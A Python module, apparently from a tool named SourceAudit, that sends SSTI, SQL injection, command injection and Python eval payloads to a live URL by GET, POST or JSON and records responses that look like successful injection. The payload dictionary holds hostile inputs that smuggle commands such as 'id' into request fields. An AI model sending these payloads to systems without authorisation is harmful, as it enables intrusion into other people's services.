# SourceAudit Live Testing Module
# Supports GET, POST, and JSON POST payload injection
# Usage:
# 1. Import the test_live_url and export_logs functions in your main script
# 2. Call test_live_url() with:
#    - url: full target URL (e.g., http://example.com/login)
#    - method: GET / POST / JSON
#    - param: parameter key to inject into (ignored if method=='JSON')
#    - json_template: a Python dict where payload gets inserted if using JSON
# 3. Call export_logs() with results + output folder

import csv
import json
import os
import requests

live_payloads = {
    "SSTI": "{{7*7}}",
    "SQLi (inline)": "' OR 1=1 --",
    "Command Injection": "test;id",
    "Insecure eval": "__import__('os').system('id')"
}

def test_live_url(url, method='GET', param='q', json_template=None, verbose=True):
    results = []
    headers = {'User-Agent': 'SourceAudit/1.0', 'Content-Type': 'application/json'} if method == 'JSON' else {'User-Agent': 'SourceAudit/1.0'}
    for vuln, payload in live_payloads.items():
        try:
            if method == 'POST':
                data = {param: payload}
                r = requests.post(url, data=data, headers=headers, timeout=5, verify=False)
            elif method == 'JSON':
                body = json_template.copy()
                for k in body:
                    body[k] = payload
                r = requests.post(url, json=body, headers=headers, timeout=5, verify=False)
            else:  # GET
                r = requests.get(url, params={param: payload}, headers=headers, timeout=5, verify=False)
            body = r.text[:500]
            if any(k in body for k in ['uid=', 'root', '49']):
                results.append({"vuln": vuln, "payload": payload, "status": r.status_code, "evidence": body.strip()})
                if verbose:
                    print(f"\n[+] {vuln} succeeded: {payload}\n\033[1;33m[Response]\033[0m {body.strip()[:200]}")
        except Exception as e:
            if verbose:
                print(f"[-] Error testing {vuln} via {method}: {e}")
    return results

def export_logs(results, output_dir):
    json_path = os.path.join(output_dir, "live_scan_results.json")
    csv_path = os.path.join(output_dir, "live_scan_results.csv")
    with open(json_path, 'w') as jf:
        json.dump(results, jf, indent=2)
    with open(csv_path, 'w', newline='') as cf:
        writer = csv.DictWriter(cf, fieldnames=results[0].keys())
        writer.writeheader()
        writer.writerows(results)
    print(f"\n\033[1;36m[+] Exported live results to:\033[0m\n  JSON: {json_path}\n  CSV: {csv_path}")
